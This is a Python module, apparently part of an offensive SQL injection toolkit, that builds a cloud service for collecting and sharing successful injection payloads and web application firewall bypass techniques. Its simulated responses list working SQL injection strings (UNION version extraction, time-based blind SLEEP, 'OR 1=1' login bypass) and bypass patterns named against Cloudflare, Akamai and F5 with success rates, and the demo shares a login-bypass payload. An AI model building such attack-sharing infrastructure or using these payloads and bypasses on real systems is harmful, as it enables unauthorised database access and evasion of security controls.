#!/usr/bin/env python3
# Collaborative Cloud Platform - Share and retrieve SQL injection data
# Creates a secure platform for sharing successful payloads and techniques

import os
import sys
import json
import time
import uuid
import hashlib
import hmac
import base64
import logging
import requests
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('cloud_platform')

class CloudPlatform:
    """
    Collaborative cloud platform for SQL injection data sharing
    """
    def __init__(self, config):
        """Initialize cloud platform with configuration"""
        self.config = config
        self.api_endpoint = config.get('api_endpoint', 'https://api.example.com/sqli-cloud')
        self.api_key = config.get('api_key', '')
        self.share_anonymous = config.get('share_anonymous_data', True)
        self.data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
        self.cloud_cache_file = os.path.join(self.data_dir, 'cloud_cache.json')
        
        # Create data directory if it doesn't exist
        os.makedirs(self.data_dir, exist_ok=True)
        
        # Initialize cache
        self.cache = self._load_cache()
        
        # Create unique instance ID if not exists
        if 'instance_id' not in self.cache:
            self.cache['instance_id'] = str(uuid.uuid4())
            self._save_cache()
            
        logger.info("Cloud Platform module initialized")
        
    def _load_cache(self):
        """Load cloud cache from file or create default"""
        if os.path.exists(self.cloud_cache_file):
            try:
                with open(self.cloud_cache_file, 'r') as f:
                    data = json.load(f)
                    logger.info(f"Cloud cache loaded from {self.cloud_cache_file}")
                    return data
            except Exception as e:
                logger.error(f"Error loading cloud cache: {e}")
                
        # Create default cache
        cache = {
            "instance_id": str(uuid.uuid4()),
            "last_sync": None,
            "payloads": {},
            "waf_bypasses": {},
            "contribution_stats": {
                "payloads_shared": 0,
                "bypasses_shared": 0,
                "last_contribution": None
            },
            "retrieved_data": {
                "payloads": {},
                "waf_bypasses": {},
                "last_retrieval": None
            }
        }
        
        # Save default cache
        try:
            with open(self.cloud_cache_file, 'w') as f:
                json.dump(cache, f, indent=2)
                logger.info(f"Default cloud cache created at {self.cloud_cache_file}")
        except Exception as e:
            logger.error(f"Error saving default cloud cache: {e}")
            
        return cache
        
    def _save_cache(self):
        """Save cloud cache to file"""
        try:
            with open(self.cloud_cache_file, 'w') as f:
                json.dump(self.cache, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving cloud cache: {e}")
            
    def _authenticate_request(self, data):
        """Add authentication to API request"""
        timestamp = str(int(time.time()))
        
        # Create request signature
        if self.api_key:
            payload = json.dumps(data).encode()
            signature = hmac.new(
                self.api_key.encode(),
                msg=payload + timestamp.encode(),
                digestmod=hashlib.sha256
            ).hexdigest()
            
            return {
                "headers": {
                    "X-API-Key": self.api_key,
                    "X-Timestamp": timestamp,
                    "X-Signature": signature,
                    "X-Instance-ID": self.cache.get('instance_id', 'unknown')
                },
                "data": data
            }
        else:
            return {
                "headers": {
                    "X-Timestamp": timestamp,
                    "X-Instance-ID": self.cache.get('instance_id', 'unknown')
                },
                "data": data
            }
            
    def _api_request(self, endpoint, method="GET", data=None):
        """Make API request to cloud platform"""
        url = f"{self.api_endpoint}/{endpoint}"
        
        # If we're in demo mode without a real endpoint, simulate response
        if "example.com" in self.api_endpoint:
            return self._simulate_api_response(endpoint, method, data)
            
        try:
            auth = self._authenticate_request(data or {})
            
            if method == "GET":
                response = requests.get(url, headers=auth["headers"], timeout=10)
            elif method == "POST":
                response = requests.post(url, headers=auth["headers"], json=auth["data"], timeout=10)
            elif method == "PUT":
                response = requests.put(url, headers=auth["headers"], json=auth["data"], timeout=10)
            else:
                logger.error(f"Unsupported HTTP method: {method}")
                return None
                
            if response.status_code in (200, 201):
                return response.json()
            else:
                logger.error(f"API request failed: {response.status_code} - {response.text}")
                return None
                
        except Exception as e:
            logger.error(f"Error making API request: {e}")
            return None
            
    def _simulate_api_response(self, endpoint, method, data):
        """Simulate API response for demo purposes"""
        logger.warning("Using simulated API response (demo mode)")
        
        if endpoint == "payloads" and method == "GET":
            return {
                "status": "success",
                "payloads": [
                    {
                        "payload": "' UNION SELECT @@version,NULL,NULL--",
                        "db_type": "mysql",
                        "success_rate": 0.78,
                        "tags": ["union", "version"]
                    },
                    {
                        "payload": "1' AND (SELECT 1 FROM (SELECT SLEEP(1))A)--",
                        "db_type": "mysql",
                        "success_rate": 0.92,
                        "tags": ["time-based", "blind"]
                    },
                    {
                        "payload": "admin') OR 1=1--",
                        "db_type": "general",
                        "success_rate": 0.65,
                        "tags": ["authentication", "bypass"]
                    }
                ]
            }
            
        elif endpoint == "waf_bypasses" and method == "GET":
            return {
                "status": "success",
                "waf_bypasses": [
                    {
                        "waf_type": "cloudflare",
                        "technique": "case_randomization",
                        "payload_pattern": "UniOn/**/%53eLecT/**/1,2,3",
                        "success_rate": 0.85
                    },
                    {
                        "waf_type": "akamai",
                        "technique": "url_encoding",
                        "payload_pattern": "%27%20OR%201%3D1%3B%2D%2D",
                        "success_rate": 0.72
                    },
                    {
                        "waf_type": "f5",
                        "technique": "comment_injection",
                        "payload_pattern": "'/**/OR/**/1/**/=/**/1",
                        "success_rate": 0.81
                    }
                ]
            }
            
        elif (endpoint == "payloads" or endpoint == "waf_bypasses") and method == "POST":
            return {
                "status": "success",
                "message": "Data received successfully",
                "contribution_id": str(uuid.uuid4())
            }
            
        return {
            "status": "error",
            "message": "Unknown endpoint or method"
        }
        
    def share_payload(self, payload, success, db_type=None, waf_bypassed=None, context=None):
        """Share a successful payload with the community"""
        if not self.share_anonymous:
            logger.info("Anonymous data sharing is disabled")
            return False
            
        # Don't share unsuccessful payloads
        if not success:
            return False
            
        # Prepare payload data
        payload_data = {
            "payload": payload,
            "db_type": db_type,
            "success": success,
            "waf_bypassed": waf_bypassed,
            "context": context,
            "timestamp": datetime.now().isoformat()
        }
        
        # Add to local cache
        payload_hash = hashlib.md5(payload.encode()).hexdigest()
        self.cache["payloads"][payload_hash] = payload_data
        self.cache["contribution_stats"]["payloads_shared"] += 1
        self.cache["contribution_stats"]["last_contribution"] = datetime.now().isoformat()
        self._save_cache()
        
        # Share with cloud platform
        result = self._api_request("payloads", method="POST", data={
            "payload": payload_data
        })
        
        if result and result.get("status") == "success":
            logger.info(f"Payload shared successfully: {payload}")
            return True
        else:
            logger.warning(f"Failed to share payload: {payload}")
            return False
            
    def share_waf_bypass(self, waf_type, technique, payload_pattern, success_rate):
        """Share a WAF bypass technique with the community"""
        if not self.share_anonymous:
            logger.info("Anonymous data sharing is disabled")
            return False
            
        # Prepare WAF bypass data
        bypass_data = {
            "waf_type": waf_type,
            "technique": technique,
            "payload_pattern": payload_pattern,
            "success_rate": success_rate,
            "timestamp": datetime.now().isoformat()
        }
        
        # Add to local cache
        bypass_hash = hashlib.md5(f"{waf_type}:{technique}:{payload_pattern}".encode()).hexdigest()
        self.cache["waf_bypasses"][bypass_hash] = bypass_data
        self.cache["contribution_stats"]["bypasses_shared"] += 1
        self.cache["contribution_stats"]["last_contribution"] = datetime.now().isoformat()
        self._save_cache()
        
        # Share with cloud platform
        result = self._api_request("waf_bypasses", method="POST", data={
            "waf_bypass": bypass_data
        })
        
        if result and result.get("status") == "success":
            logger.info(f"WAF bypass shared successfully for {waf_type}")
            return True
        else:
            logger.warning(f"Failed to share WAF bypass for {waf_type}")
            return False
            
    def get_payloads(self, db_type=None, context=None, limit=10):
        """Get successful payloads from the community"""
        # Always fetch from cloud to get latest data
        result = self._api_request("payloads", method="GET", data={
            "db_type": db_type,
            "context": context,
            "limit": limit
        })
        
        if result and result.get("status") == "success":
            payloads = result.get("payloads", [])
            
            # Update cache with retrieved data
            for payload_data in payloads:
                payload = payload_data.get("payload", "")
                payload_hash = hashlib.md5(payload.encode()).hexdigest()
                self.cache["retrieved_data"]["payloads"][payload_hash] = payload_data
                
            self.cache["retrieved_data"]["last_retrieval"] = datetime.now().isoformat()
            self._save_cache()
            
            logger.info(f"Retrieved {len(payloads)} payloads from cloud")
            return payloads
        else:
            logger.warning("Failed to retrieve payloads from cloud, using cached data")
            
            # Use cached data as fallback
            cached_payloads = list(self.cache["retrieved_data"]["payloads"].values())
            
            # Filter by db_type and context if provided
            if db_type:
                cached_payloads = [p for p in cached_payloads if p.get("db_type") == db_type]
            if context:
                cached_payloads = [p for p in cached_payloads if p.get("context") == context]
                
            # Limit results
            cached_payloads = cached_payloads[:limit]
            
            return cached_payloads
            
    def get_waf_bypasses(self, waf_type=None, limit=10):
        """Get WAF bypass techniques from the community"""
        # Always fetch from cloud to get latest data
        result = self._api_request("waf_bypasses", method="GET", data={
            "waf_type": waf_type,
            "limit": limit
        })
        
        if result and result.get("status") == "success":
            bypasses = result.get("waf_bypasses", [])
            
            # Update cache with retrieved data
            for bypass_data in bypasses:
                waf = bypass_data.get("waf_type", "")
                technique = bypass_data.get("technique", "")
                pattern = bypass_data.get("payload_pattern", "")
                bypass_hash = hashlib.md5(f"{waf}:{technique}:{pattern}".encode()).hexdigest()
                self.cache["retrieved_data"]["waf_bypasses"][bypass_hash] = bypass_data
                
            self.cache["retrieved_data"]["last_retrieval"] = datetime.now().isoformat()
            self._save_cache()
            
            logger.info(f"Retrieved {len(bypasses)} WAF bypasses from cloud")
            return bypasses
        else:
            logger.warning("Failed to retrieve WAF bypasses from cloud, using cached data")
            
            # Use cached data as fallback
            cached_bypasses = list(self.cache["retrieved_data"]["waf_bypasses"].values())
            
            # Filter by waf_type if provided
            if waf_type:
                cached_bypasses = [b for b in cached_bypasses if b.get("waf_type") == waf_type]
                
            # Limit results
            cached_bypasses = cached_bypasses[:limit]
            
            return cached_bypasses
            
    def get_contribution_stats(self):
        """Get statistics about contributions to the community"""
        return self.cache["contribution_stats"]
        
    def enable_data_sharing(self, enable=True):
        """Enable or disable anonymous data sharing"""
        self.share_anonymous = enable
        self.config['share_anonymous_data'] = enable
        
        logger.info(f"Anonymous data sharing {'enabled' if enable else 'disabled'}")
        return True
        
    def sync_data(self):
        """Force synchronization with cloud platform"""
        # Get latest payloads
        self.get_payloads(limit=100)
        
        # Get latest WAF bypasses
        self.get_waf_bypasses(limit=100)
        
        self.cache["last_sync"] = datetime.now().isoformat()
        self._save_cache()
        
        logger.info("Data synchronized with cloud platform")
        return True

if __name__ == "__main__":
    # Simple test/demo
    config = {
        'api_endpoint': 'https://api.example.com/sqli-cloud',
        'api_key': '',
        'share_anonymous_data': True
    }
    
    cloud = CloudPlatform(config)
    
    # Get some payloads
    print("Getting payloads from cloud:")
    payloads = cloud.get_payloads(db_type="mysql", limit=3)
    for p in payloads:
        print(f"- {p['payload']} (Success rate: {p['success_rate']})")
        
    # Get WAF bypasses
    print("\nGetting WAF bypasses from cloud:")
    bypasses = cloud.get_waf_bypasses(limit=3)
    for b in bypasses:
        print(f"- {b['waf_type']}: {b['payload_pattern']} (Success rate: {b['success_rate']})")
        
    # Share a payload
    cloud.share_payload(
        payload="' OR 1='1' -- ",
        success=True,
        db_type="mysql",
        context="login"
    )
    
    # Print stats
    stats = cloud.get_contribution_stats()
    print(f"\nContributions: {stats['payloads_shared']} payloads, {stats['bypasses_shared']} WAF bypasses")
